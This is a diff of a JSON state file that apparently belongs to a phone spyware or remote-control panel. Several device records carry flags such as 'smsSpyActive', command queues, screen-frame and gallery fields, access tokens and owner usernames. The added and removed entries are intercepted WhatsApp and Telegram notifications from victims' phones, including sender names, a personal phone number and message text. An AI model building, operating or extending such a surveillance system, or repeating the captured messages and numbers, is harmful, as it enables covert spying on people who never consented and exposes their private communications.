@@ -6331,6 +6331,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (152 pesan): ~ OISHIX STORE REAL",
+        "content": "N FF BRAYY DANA 0-1JT+ , UTAMAKAN BER SG LOBY+BER MAX \n`WAJIB BIND ON , GANERIMA BIND MTI , GECEE TAWARIN BUTUH BNYK`",
+        "time": "21/04 21:30",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781851831
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎2954 pesan dari 19 chat",
         "time": "21/04 21:30",
@@ -10320,14 +10328,6 @@
         "time": "21/04 21:01",
         "pkg": "com.whatsapp",
         "receivedAt": 1776780085037
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "raka",
-        "content": "bre",
-        "time": "21/04 21:01",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780084763
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776781850443,
+    "lastSeen": 1776781852256,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 21:30",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781853912
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 21:30",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781853883
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram: Pengguna",
+        "content": "Pesan baru",
+        "time": "21/04 21:30",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776781853730
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "21/04 21:30",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781853101
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "21/04 21:30",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781852260
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram: Pengguna",
@@ -14362,46 +14402,6 @@
         "time": "21/04 21:09",
         "pkg": "com.whatsapp",
         "receivedAt": 1776780556910
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 896-7342-6335",
-        "content": "slow jek",
-        "time": "21/04 21:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780556891
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Memeriksa pesan baru",
-        "time": "21/04 21:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780552687
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Memeriksa pesan baru",
-        "time": "21/04 21:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776780551250
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 21:08",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776780531626
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram: Pengguna",
-        "content": "Pesan baru",
-        "time": "21/04 21:08",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776780531590
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781849754,
+    "lastSeen": 1776781852936,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
